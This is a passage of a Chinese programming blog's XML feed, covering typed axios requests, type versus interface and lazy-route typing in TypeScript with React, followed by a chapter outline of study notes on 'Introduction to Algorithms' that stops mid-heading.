data,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span><br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>这里封装登录请求方法loginReq，他的参数必须是我们定义的ILogin接口的类型。这个方法返回一个类型为<code>AxiosPromise</code>的Promise，AxiosPromise是axios声明文件内置的类型，可以传入一个泛型变量参数，用于指定返回的结果中data字段的类型。 </p><p>接下来可以调用一下这个登录的接口：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> &#123; loginReq &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/api/user&#x27;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Home</span>: <span class="hljs-variable constant_">FC</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">login</span> = (<span class="hljs-params">params</span>) =&gt; &#123;<br>  <span class="hljs-title function_">loginReq</span>(params).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">data</span>.<span class="hljs-property">code</span>)<br>  &#125;)<br>  &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>通过这种方式，当我们调用loginReq接口时，就会提示我们，参数的类型是ILogin，需要传入几个参数。这样编写代码的体验就会好很多。</p><h3 id="6-Types-or-Interfaces？"><a href="#6-Types-or-Interfaces？" class="headerlink" title="6 Types or Interfaces？"></a>6 Types or Interfaces？</h3><p>我们可以使用types或者Interfaces来定义类型吗，那么该如何选择他俩呢？建议如下：</p><ul><li>在定义公共 API 时(比如编辑一个库）使用 interface，这样可以方便使用者继承接口，这样允许使用最通过声明合并来扩展它们；</li><li>在定义组件属性（Props）和状态（State）时，建议使用 type，因为 type 的约束性更强。</li></ul><p>interface 和 type 在 ts 中是两个不同的概念，但在 React 大部分使用的 case 中，interface 和 type 可以达到相同的功能效果，type 和 interface 最大的区别是：type 类型不能二次编辑，而 interface 可以随时扩展：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span><br>&#125;<br><br><span class="hljs-comment">// 可以继续在原属性基础上，添加新属性：color</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-attr">color</span>: <span class="hljs-built_in">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Animal</span> = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span><br>&#125;<br><span class="hljs-comment">// type类型不支持属性扩展</span><br><span class="hljs-comment">// Error: Duplicate identifier &#x27;Animal&#x27;</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Animal</span> = &#123;<br>  <span class="hljs-attr">color</span>: <span class="hljs-built_in">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>type对于联合类型是很有用的，比如：type Type &#x3D; TypeA | TypeB。而interface更适合声明字典类行，然后定义或者扩展它。</p><h3 id="7-懒加载类型"><a href="#7-懒加载类型" class="headerlink" title="7 懒加载类型"></a>7 懒加载类型</h3><p>如果我们想在React router中使用懒加载，React也为我们提供了懒加载方法的类型，来看下面的例子：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RouteType</span> &#123;<br>    <span class="hljs-attr">pathname</span>: <span class="hljs-built_in">string</span>;<br>    <span class="hljs-attr">component</span>: <span class="hljs-title class_">LazyExoticComponent</span>&lt;<span class="hljs-built_in">any</span>&gt;;<br>    <span class="hljs-attr">exact</span>: <span class="hljs-built_in">boolean</span>;<br>    title?: <span class="hljs-built_in">string</span>;<br>    icon?: <span class="hljs-built_in">string</span>;<br>    children?: <span class="hljs-title class_">RouteType</span>[];<br>&#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">AppRoutes</span>: <span class="hljs-title class_">RouteType</span>[] = [<br>    &#123;<br>        <span class="hljs-attr">pathname</span>: <span class="hljs-string">&#x27;/login&#x27;</span>,<br>        <span class="hljs-attr">component</span>: <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">import</span>(<span class="hljs-string">&#x27;../views/Login/Login&#x27;</span>)),<br>        <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span><br>    &#125;,<br>    &#123;<br>        <span class="hljs-attr">pathname</span>: <span class="hljs-string">&#x27;/404&#x27;</span>,<br>        <span class="hljs-attr">component</span>: <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">import</span>(<span class="hljs-string">&#x27;../views/404/404&#x27;</span>)),<br>        <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>,<br>    &#125;,<br>    &#123;<br>        <span class="hljs-attr">pathname</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>        <span class="hljs-attr">exact</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">component</span>: <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">import</span>(<span class="hljs-string">&#x27;../views/Admin/Admin&#x27;</span>))<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><p>下面是懒加载类型和lazy方法在声明文件中的定义：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">LazyExoticComponent</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ComponentType</span>&lt;<span class="hljs-built_in">any</span>&gt;&gt; = <span class="hljs-title class_">ExoticComponent</span>&lt;<span class="hljs-title class_">ComponentPropsWithRef</span>&lt;T&gt;&gt; &amp; &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">_result</span>: T;<br>&#125;;<br><br><span class="hljs-keyword">function</span> lazy&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ComponentType</span>&lt;<span class="hljs-built_in">any</span>&gt;&gt;(<br><span class="hljs-attr">factory</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;&#123; <span class="hljs-attr">default</span>: T &#125;&gt;<br>): <span class="hljs-title class_">LazyExoticComponent</span>&lt;T&gt;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>typescript</tag>
      
      <tag>react</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法导论笔记</title>
    <link href="/blog/2022/11/03/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA/"/>
    <url>/blog/2022/11/03/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="算法导论"><a href="#算法导论" class="headerlink" title="算法导论"></a>算法导论</h2><h3 id="一：基础知识"><a href="#一：基础知识" class="headerlink" title="一：基础知识"></a>一：基础知识</h3><h4 id="1-算法基础"><a href="#1-算法基础" class="headerlink" title="1 算法基础"></a>1 算法基础</h4><h5 id="1-1-插入排序（增量）"><a href="#1-1-插入排序（增量）" class="headerlink" title="1.1 插入排序（增量）"></a>1.1 插入排序（增量）</h5><p>循环不变性</p><h5 id="1-2-分析算法"><a href="#1-2-分析算法" class="headerlink" title="1.2 分析算法"></a>1.2 分析算法</h5><p>输入规模</p><p>最坏情况与平均情况分析</p><p>增长量级</p><h5 id="1-3-设计算法"><a href="#1-3-设计算法" class="headerlink" title="1.3 设计算法"></a>1.3 设计算法</h5><p><strong>分治法</strong></p><p>许多有用的算法在结构上是递归的：为了解决一个给定的问题，算法一次或多次递归地调用其自身以解决紧密相关的若干子问题。这些算法都典型地遵循分治法的思想：将原问题分解成规模较小但类似于原问题的子问题，递归地解决这些子问题，然后再合并这些子问题的解来建立原问题的解。</p><p>分治算法在每层递归时都有三个步骤：分解、解决、合并</p><p>&#x3D;&#x3D;举例：归并排序算法&#x3D;&#x3D;</p><h4 id="2-函数的增长"><a href="#2-函数的增长" class="headerlink" title="2 函数的增长"></a>2 函数的增长</h4><h5 id="2-1-渐进记号"><a href="#2-1-渐进记号" class="headerlink" title="2.1 渐进记号"></a>2.1 渐进记号</h5><h5 id="2-2-标准记号和常用函数"><a href="#2-2-标准记号和常用函数" class="headerlink" title="2.2 标准记号和常用函数"></a>2.2 标准记号和常用函数</h5><h4 id="3-分治策略"><a href="#3-分治策略" class="headerlink" title="3 分治策略"></a>3 分治策略</h4><h5 id="3-1-递归式"><a href="#3-1-递归式" class="headerlink" title="3.1 递归式"></a>3.1 递归式</h5><p>求解递归式的方法：代入法、递归树法、主方法</p><h5 id="x3D-x3D-3-2-最大子数组问题-x3D-x3D"><a href="#x3D-x3D-3-2-最大子数组问题-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;3.2 最大子数组问题&#x3D;&#x3D;"></a>&#x3D;&#x3D;3.2 最大子数组问题&#x3D;&#x3D;</h5><p>股票买卖</p><p>使用分治策略的求解方法</p><p>分治算法的分析</p><h5 id="x3D-x3D-3-3-矩阵乘法的Strassen算法-x3D-x3D"><a href="#x3D-x3D-3-3-矩阵乘法的Strassen算法-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;3.3 矩阵乘法的Strassen算法&#x3D;&#x3D;"></a>&#x3D;&#x3D;3.3 矩阵乘法的Strassen算法&#x3D;&#x3D;</h5><h5 id="3-4-用代入法求解递归式"><a href="#3-4-用代入法求解递归式" class="headerlink" title="3.4 用代入法求解递归式"></a>3.4 用代入法求解递归式</h5><ol><li>猜测解的形式</li><li>用数学归纳法求出解中的常数，并证明解是正确的</li></ol><h5 id="3-5-用递归树方法求解递归式"><a href="#3-5-用递归树方法求解递归式" class="headerlink" title="3.5 用递归树方法求解递归式"></a>3.5 用递归树方法求解递归式</h5><h5 id="3-6-用主方法求解递归式"><a href="#3-6-用主方法求解递归式" class="headerlink" title="3.6 用主方法求解递归式"></a>3.6 用主方法求解递归式</h5><p>证明主定理</p><h4 id="4-概率分析和随机算法"><a href="#4-概率分析和随机算法" class="headerlink" title="4 概率分析和随机算法"></a>4 概率分析和随机算法</h4><p>&#x3D;&#x3D;4.1 雇用问题&#x3D;&#x3D;</p><p>在任何时候雇佣更好的办公助理并为此支付费用</p><p>最坏情况分析</p><p>概率分析</p><p>随机算法</p><p>指示器随机变量</p><p>随机算法</p><p>随机排列数组</p><p>4.2 概率分析和指示器随机变量的进一步使用</p><p>生日悖论</p><p>球与箱子&#x2F;礼券收集者问题</p><p>特征序列</p><p>在线雇佣问题</p><h3 id="二：排序和顺序统计量"><a href="#二：排序和顺序统计量" class="headerlink" title="二：排序和顺序统计量"></a>二：排序和顺序统计量</h3><h4 id="x3D-x3D-1-堆排序-x3D-x3D"><a href="#x3D-x3D-1-堆排序-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1 堆排序&#x3D;&#x3D;"></a>&#x3D;&#x3D;1 堆排序&#x3D;&#x3D;</h4><p>堆</p><p>维护堆的性质</p><p>建堆</p><p>堆排序算法</p><p>优先队列</p><h4 id="x3D-x3D-2-快速排序-x3D-x3D"><a href="#x3D-x3D-2-快速排序-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;2 快速排序&#x3D;&#x3D;"></a>&#x3D;&#x3D;2 快速排序&#x3D;&#x3D;</h4><p>分治思想</p><p>快速排序性能</p><p>快速排序的随机化版本</p><p>快速排序分析</p><h4 id="3-线性时间排序"><a href="#3-线性时间排序" class="headerlink" title="3 线性时间排序"></a>3 线性时间排序</h4><p>排序算法的下界：&#x3D;&#x3D;决策树模型&#x3D;&#x3D;</p><p>最坏情况的下界</p><p>&#x3D;&#x3D;计数排序&#x3D;&#x3D;</p><p>&#x3D;&#x3D;基数排序&#x3D;&#x3D;</p><p>&#x3D;&#x3D;桶排序&#x3D;&#x3D;</p><h4 id="4-中位数和顺序统计量"><a href="#4-中位数和顺序统计量" class="headerlink" title="4 中位数和顺序统计量"></a>4 中位数和顺序统计量</h4><p>最大值和最小值</p><p>&#x3D;&#x3D;期望为线性时间的选择算法&#x3D;&#x3D;</p><p>&#x3D;&#x3D;最坏情况为线性时间的选择算法&#x3D;&#x3D;</p><h3 id="三：数据结构"><a href="#三：数据结构" class="headerlink" title="三：数据结构"></a>三：数据结构</h3><h4 id="1-基本数据结构"><a href="#1-基本数据结构" class="headerlink" title="1 基本数据结构"></a>1 基本数据结构</h4><p>栈和队列</p><p>链表</p><p>指针和对象的实现</p><p>有根树的表示：二叉树、分支无限制的有根树</p><h4 id="2-散列表"><a href="#2-散列表" class="headerlink" title="2 散列表"></a>2 散列表</h4><p>直接寻址表</p><p>散列表：链接法、开放寻址法</p><h4 id="3-散列函数"><a href="#3-散列函数" class="headerlink" title="3 散列函数"></a>3 散列函数</h4><p>除法散列法</p><p>乘法散列法</p><p>全域散列法</p><p>开放寻址法：线性探查、二次探查、双重散列、开放寻址法的分析</p><p>完全散列</p><h4 id="4-二叉搜索树"><a href="#4-二叉搜索树" class="headerlink" title="4 二叉搜索树"></a>4 二叉搜索树</h4><p>什么是二叉搜索树</p><p>查询二叉搜索树：最大关键字元素和最小关键字元素、后继和前驱</p><p>插入和删除</p><p>随机构建二叉搜索树</p><h4 id="5-红黑树"><a href="#5-红黑树" class="headerlink" title="5 红黑树"></a>5 红黑树</h4><p>红黑树的性质</p><p>旋转</p><p>插入</p><h4 id="6-数据结构的扩张"><a href="#6-数据结构的扩张" class="headerlink" title="6 数据结构的扩张"></a>6 数据结构的扩张</h4><p>动态顺序统计</p><p>如何扩张数据结构</p><p>区间树</p><h3 id="四：高级设计和分析技术"><a href="#四：高级设计和分析技术" class="headerlink" title="四：高级设计和分析技术"></a>四：高级设计和分析技术</h3><h4 id="1-动态规划"><a href="#1-动态规划" class="headerlink" title="1 动态规划"></a>1 动态规划</h4><p>用于求解最优化问题</p><p>&#x3D;&#x3D;钢条切割&#x3D;&#x3D;</p><p>&#x3D;&#x3D;矩阵链乘法&#x3D;&#x3D;</p><p>动态规划原理：最优子结构、子问题重叠</p><p>重构最优解、备忘</p><p>&#x3D;&#x3D;最长公共子序列&#x3D;&#x3D;</p><p>&#x3D;&#x3D;最优二叉搜索树&#x3D;&#x3D;</p><h4 id="2-贪心算法"><a href="#2-贪心算法" class="headerlink" title="2 贪心算法"></a>2 贪心算法</h4><p>&#x3D;&#x3D;活动选择问题&#x3D;&#x3D;：调度竞争共享资源的多个活动</p><p>贪心算法原理：贪心选择性质、最有子结构、贪心对动态规划（0-1背包、分数背包）</p><p>&#x3D;&#x3D;赫夫曼编码&#x3D;&#x3D;：变长编码、前缀码、构造赫夫曼编码、赫夫曼算法的正确性</p><p>拟阵和贪心算法：矩阵拟阵、图拟阵、加权拟阵上的贪心算法</p><p>用拟阵求解任务调度问题</p><h4 id="3-摊还分析"><a href="#3-摊还分析" class="headerlink" title="3 摊还分析"></a>3 摊还分析</h4><p>聚合分析：栈操作、二进制计数器递增</p><p>核算法：栈操作、二进制计数器递增</p><p>势能法：栈操作、二进制计数器递增</p><p>动态表：表扩张、表扩张和收缩</p><h3 id="五：高级数据结构"><a href="#五：高级数据结构" class="headerlink" title="五：高级数据结构"></a>五：高级数据结构</h3><h4 id="1-B树"><a href="#1-B树" class="headerlink" title="1 B树"></a>1 B树</h4><p>辅存上的数据结构</p><p>B树的定义</p><p>B树上的基本操作：创建一个空的B树、向B树中插入一个关键字、分裂B树中的结点、以沿树单程下行方式向B树插入关键字</p><p>从B树中删除关键字</p><h4 id="2-斐波那契堆"><a href="#2-斐波那契堆" class="headerlink" title="2 斐波那契堆"></a>2 斐波那契堆</h4><p>可合并堆</p><p>理论上的斐波那契堆与实际中的斐波那契堆</p><p>斐波那契堆结构：势函数、最大度数</p><h5 id="2-2-可合并堆操作：创建一个新的斐波那契堆、插入一个结点、寻找最小结点、两个斐波那契堆的合并、抽取最小结点"><a href="#2-2-可合并堆操作：创建一个新的斐波那契堆、插入一个结点、寻找最小结点、两个斐波那契堆的合并、抽取最小结点" class="headerlink" title="2.2 可合并堆操作：创建一个新的斐波那契堆、插入一个结点、寻找最小结点、两个斐波那契堆的合并、抽取最小结点"></a>2.2 可合并堆操作：创建一个新的斐波那契堆、插入一个结点、寻找最小结点、两个斐波那契堆的合并、抽取最小结点</h5><h5 id="2-3-关键字减值和删除一个结点"><a href="#2-3-关键字减值和删除一个结点" class="headerlink" title="2.3 关键字减值和删除一个结点"></a>2.3 关键字减值和删除一个结点</h5><h5 id="2-4-最大度数的界"><a href="#2-4-最大度数的界" class="headerlink" title="2.4 最大度数的界"></a>2.4 最大度数的界</h5><h4 id="3-van-Emde-Boas树"><a href="#3-van-Emde-Boas树" class="headerlink" title="3 van Emde Boas树"></a>3 van Emde Boas树</h4><h5 id="3-1-基本方法"><a href="#3-1-基本方法" class="headerlink" title="3.1 基本方法"></a>3.1 基本方法</h5><p>直接寻址</p><p>叠加的二叉树结构</p><p>叠加的一颗高度恒定的树</p><h5 id="3-2-递归结构"><a href="#3-2-递归结构" class="headerlink" title="3.2 递归结构"></a>3.2 递归结构</h5><p>原型van Emde Boas结构</p><p>原型van Emde Boas结构上的操作：判断一个值是否在集合中、查找最小元素、查找后继、插入元素、删除元素</p><p>van Emde Boas树及其操作：查找最小元素和最大元素、判断一个值是否在集合中、查找前驱和后继、插入一个元素、删除一个元素</p><h4 id="4-用于不相交集合的数据结构"><a href="#4-用于不相交集合的数据结构" class="headerlink" title="4 用于不相交集合的数据结构"></a>4 用于不相交集合的数据结构</h4><p>不相交集合的操作</p><p>不相交集合的链表表示：合并的一个简单实现、一种加权合并的启发式策略</p><p>不相交集合森林：改进运行时间的启发式策略、实现不相交集合森林的伪代码、启发式策略对运行时间的影响</p><p>带路径压缩的按秩合并的分析：一个增长非常慢的函数与其增长非常慢的逆函数、秩的性质、时间界的证明、势函数、势的变化与操作的摊还分析</p><h3 id="六：图算法"><a href="#六：图算法" class="headerlink" title="六：图算法"></a>六：图算法</h3><h4 id="1-基本的图算法"><a href="#1-基本的图算法" class="headerlink" title="1 基本的图算法"></a>1 基本的图算法</h4><p>图的表示</p><p>广度优先搜索</p><p>&#x3D;&#x3D;最短路径&#x3D;&#x3D;</p><p>广度优先树</p><p>深度优先搜索</p><p>拓扑排序</p><p>强连通分量</p><h4 id="2-x3D-x3D-最小生成树-x3D-x3D"><a href="#2-x3D-x3D-最小生成树-x3D-x3D" class="headerlink" title="2 &#x3D;&#x3D;最小生成树&#x3D;&#x3D;"></a>2 &#x3D;&#x3D;最小生成树&#x3D;&#x3D;</h4><p>最小生成树的形成</p><p>&#x3D;&#x3D;Kruskal算法和Prim算法&#x3D;&#x3D;</p><h4 id="3-x3D-x3D-单源最短路径-x3D-x3D"><a href="#3-x3D-x3D-单源最短路径-x3D-x3D" class="headerlink" title="3 &#x3D;&#x3D;单源最短路径&#x3D;&#x3D;"></a>3 &#x3D;&#x3D;单源最短路径&#x3D;&#x3D;</h4><p>最短路径的几个变体</p><p>负权重的边</p><p>环路</p><p>最短路径的表示</p><p>松弛操作</p><p>最短路径和松弛操作的性质</p><p>&#x3D;&#x3D;Bellman-Ford算法&#x3D;&#x3D;</p><p>有向无环图中的单源最短路径问题</p><p>&#x3D;&#x3D;Dijkstra算法&#x3D;&#x3D;</p><p>差分约束系统</p><p>最短路径性质的证明</p><p>松弛操作与最短路径树</p><h4 id="4-所有结点对的最短路径问题"><a href="#4-所有结点对的最短路径问题" class="headerlink" title="4 所有结点对的最短路径问题"></a>4 所有结点对的最短路径问题</h4><p>最短路径和矩阵乘法：最短路径的结构、所有结点对最短路径的递归解、自底向上计算最短路径权重、改进算法的运行时间</p><p>&#x3D;&#x3D;Floyd-Warshall算法&#x3D;&#x3D;</p><p>自底向上计算最短路径权重、构建一条最短路径、有向图的传递闭包</p><p>&#x3D;&#x3D;用于稀疏图的Johnson算法&#x3D;&#x3D;</p><p>通过重新复制来生成非负权重、计算所有结点对之间的最短路径</p><h4 id="5-最大流"><a href="#5-最大流" class="headerlink" title="5 最大流"></a>5 最大流</h4><p>流网络：容量限制、流量守恒、用反平行边来模拟问题、具有多个源结点和多个汇点的网络</p><p>&#x3D;&#x3D;Frod-Fulkerson方法&#x3D;&#x3D;</p><p>残存网络、增广路径、流网络的切割</p><p>Edmonds-Karp算法</p><p>&#x3D;&#x3D;推送-重贴标签算法&#x3D;&#x3D;</p><p>&#x3D;&#x3D;前置重贴标签算法&#x3D;&#x3D;</p><h3 id="七：算法问题选编"><a href="#七：算法问题选编" class="headerlink" title="七：算法问题选编"></a>七：算法问题选编</h3><h4 id="1-多线程算法"><a href="#1-多线程算法" class="headerlink" title="1 多线程算法"></a>1 多线程算法</h4><h5 id="1-1-动态多线程基础"><a href="#1-1-动态多线程基础" class="headerlink" title="1.1 动态多线程基础"></a>1.1 动态多线程基础</h5><p>多线程执行的模型</p><p>性能度量</p><p>调度</p><p>多线程算法的分析</p><p>并行循环</p><p>竞争条件</p><p>&#x3D;&#x3D;国际象棋&#x3D;&#x3D;</p><h5 id="1-2-多线程矩阵算法"><a href="#1-2-多线程矩阵算法" class="headerlink" title="1.2 多线程矩阵算法"></a>1.2 多线程矩阵算法</h5><p>矩阵算法的多线程算法</p><p>矩阵算法的分治多线程算法</p><p>多线程Strassen算法</p><h5 id="1-3-多线程归并排序"><a href="#1-3-多线程归并排序" class="headerlink" title="1.3 多线程归并排序"></a>1.3 多线程归并排序</h5><p>多线程归并排序分析</p><h4 id="2-矩阵运算"><a href="#2-矩阵运算" class="headerlink" title="2 矩阵运算"></a>2 矩阵运算</h4><h5 id="2-1-求解线性方程组"><a href="#2-1-求解线性方程组" class="headerlink" title="2.1 求解线性方程组"></a>2.1 求解线性方程组</h5><p>LUP分解</p><p>正向替换和反向替换</p><p>计算一个LU分解</p><p>计算一个LUP分解</p><h5 id="2-2-矩阵求逆"><a href="#2-2-矩阵求逆" class="headerlink" title="2.2 矩阵求逆"></a>2.2 矩阵求逆</h5><p>通过LUP分解计算逆矩阵</p><p>矩阵算法和矩阵求逆</p><h5 id="2-3-对称正定矩阵和最小二乘逼近"><a href="#2-3-对称正定矩阵和最小二乘逼近" class="headerlink" title="2.3 对称正定矩阵和最小二乘逼近"></a>2.3 对称正定矩阵和最小二乘逼近</h5><h4 id="3-线性规划"><a href="#3-线性规划" class="headerlink" title="3 线性规划"></a>3 线性规划</h4><p>一个政治问题</p><p>一般线性规划</p><p>线性规划综述</p><p>单纯形法</p><p>线性规划算法</p><h5 id="3-1-松弛型和标准型"><a href="#3-1-松弛型和标准型" class="headerlink" title="3.1 松弛型和标准型"></a>3.1 松弛型和标准型</h5><p>转换线性规划为标准型</p><p>转换线性规划为松弛型</p><h5 id="3-2-将问题表达为线性规划"><a href="#3-2-将问题表达为线性规划" class="headerlink" title="3.2 将问题表达为线性规划"></a>3.2 将问题表达为线性规划</h5><p>最短路径</p><p>最大流</p><p>最小费用流</p><p>多商品流</p><h5 id="3-3-单纯形算法"><a href="#3-3-单纯形算法" class="headerlink" title="3.3 单纯形算法"></a>3.3 单纯形算法</h5><h5 id="3-4-对偶性"><a href="#3-4-对偶性" class="headerlink" title="3.4 对偶性"></a>3.4 对偶性</h5><h5 id="3-5-初始基本可行解"><a href="#3-5-初始基本可行解" class="headerlink" title="3.5 初始基本可行解"></a>3.5 初始基本可行解</h5><h4 id="4-多项式与快速傅立叶变化"><a href="#4-多项式与快速傅立叶变化" class="headerlink" title="4 多项式与快速傅立叶变化"></a>4 多项式与快速傅立叶变化</h4><h5 id="4-1-多项式的表示"><a href="#4-1-多项式的表示" class="headerlink" title="4.1 多项式的表示"></a>4.1 多项式的表示</h5><p>系数表示</p><p>点值表示</p><p>系数形式表示的多项式的快速乘法</p><h5 id="4-2-DFT与FFT"><a href="#4-2-DFT与FFT" class="headerlink" title="4.2 DFT与FFT"></a>4.2 DFT与FFT</h5><p>单位复数根</p><p>在单位复数根处插值</p><h5 id="4-3-高效FFT实现"><a href="#4-3-高效FFT实现" class="headerlink" title="4.3 高效FFT实现"></a>4.3 高效FFT实现</h5><p>FFT的一种迭代实现</p><p>并行FFT电路</p><h4 id="5-数论算法"><a href="#5-数论算法" class="headerlink" title="5 数论算法"></a>5 数论算法</h4><p>输入规模与算数计算的代价</p><h5 id="5-1-基础数论概念"><a href="#5-1-基础数论概念" class="headerlink" title="5.1 基础数论概念"></a>5.1 基础数论概念</h5><h5 id="5-2-最大公约数"><a href="#5-2-最大公约数" class="headerlink" title="5.2 最大公约数"></a>5.2 最大公约数</h5><p>欧几里得算法</p><p>运行时间</p><h5 id="5-3-模运算"><a href="#5-3-模运算" class="headerlink" title="5.3 模运算"></a>5.3 模运算</h5><h5 id="5-4-求解模线性方程"><a href="#5-4-求解模线性方程" class="headerlink" title="5.4 求解模线性方程"></a>5.4 求解模线性方程</h5><h5 id="5-5-中国余数定理"><a href="#5-5-中国余数定理" class="headerlink" title="5.5 中国余数定理"></a>5.5 中国余数定理</h5><h5 id="5-6-元素的幂"><a href="#5-6-元素的幂" class="headerlink" title="5.6 元素的幂"></a>5.6 元素的幂</h5><h5 id="5-7-RSA公钥加密系统"><a href="#5-7-RSA公钥加密系统" class="headerlink" title="5.7 RSA公钥加密系统"></a>5.7 RSA公钥加密系统</h5><h5 id="5-8-素数的测试"><a href="#5-8-素数的测试" class="headerlink" title="5.8 素数的测试"></a>5.8 素数的测试</h5><p>素数的密度</p><p>伪素树测试过程</p><p>Miller-Rabin随机性素树测试方法</p><h5 id="5-9-整数的因子分解"><a href="#5-9-整数的因子分解" class="headerlink" title="5.9 整数的因子分解"></a>5.9 整数的因子分解</h5><h4 id="6-字符串匹配"><a href="#6-字符串匹配" class="headerlink" title="6 字符串匹配"></a>6 字符串匹配</h4><h5 id="6-1-朴素字符串匹配算法"><a href="#6-1-朴素字符串匹配算法" class="headerlink" title="6.1 朴素字符串匹配算法"></a>6.1 朴素字符串匹配算法</h5><h5 id="6-2-Rabin-Karp算法"><a href="#6-2-Rabin-Karp算法" class="headerlink" title="6.2 Rabin-Karp算法"></a>6.2 Rabin-Karp算法</h5><h5 id="6-3-利用有限自动机进行字符串匹配"><a href="#6-3-利用有限自动机进行字符串匹配" class="headerlink" title="6.3 利用有限自动机进行字符串匹配"></a>6.3 利用有限自动机进行字符串匹配</h5><h5 id="6-4-Knuth-Morris-Pratt算法"><a href="#6-4-Knuth-Morris-Pratt算法" class="headerlink" title="6.4 Knuth-Morris-Pratt算法"></a>6.4 Knuth-Morris-Pratt算法</h5><p>关于模式的前缀函数</p><p>运行时间分析</p><p>前缀函数计算的正确性</p><p>KMP算法的正确性</p><h4 id="7-计算几何学"><a href="#7-计算几何学" class="headerlink" title="7 计算几何学"></a>7 计算几何学</h4><h5 id="7-1-线段的性质"><a href="#7-1-线段的性质" class="headerlink" title="7.1 线段的性质"></a>7.1 线段的性质</h5><p>叉积、确定连续线段是向左转还是向右转、判定两条线段是否相交</p><h5 id="7-2-确定任意一对线段是否相交"><a href="#7-2-确定任意一对线段是否相交" class="headerlink" title="7.2 确定任意一对线段是否相交"></a>7.2 确定任意一对线段是否相交</h5><p>线段排序</p><p>移动扫除线</p><h5 id="7-3-寻找凸包"><a href="#7-3-寻找凸包" class="headerlink" title="7.3 寻找凸包"></a>7.3 寻找凸包</h5><p>增量法、分治法、剪纸-搜索法</p><p>Graham扫描法</p><h4 id="8-NP完全性"><a href="#8-NP完全性" class="headerlink" title="8 NP完全性"></a>8 NP完全性</h4><p>最短与最长路径</p><p>欧拉回路与哈密顿圈</p><p>2CNF可满足性问题与3-CNF可满足性问题</p><p>NP完全性与P类问题和NP类问题</p><p>证明NP完全问题概述</p><p>判定问题与最优化问题</p><p>归约</p><h5 id="8-1-多项式时间"><a href="#8-1-多项式时间" class="headerlink" title="8.1 多项式时间"></a>8.1 多项式时间</h5><p>抽象问题</p><p>编码</p><p>形式语言体系</p><h5 id="8-2-多项式时间的验证"><a href="#8-2-多项式时间的验证" class="headerlink" title="8.2 多项式时间的验证"></a>8.2 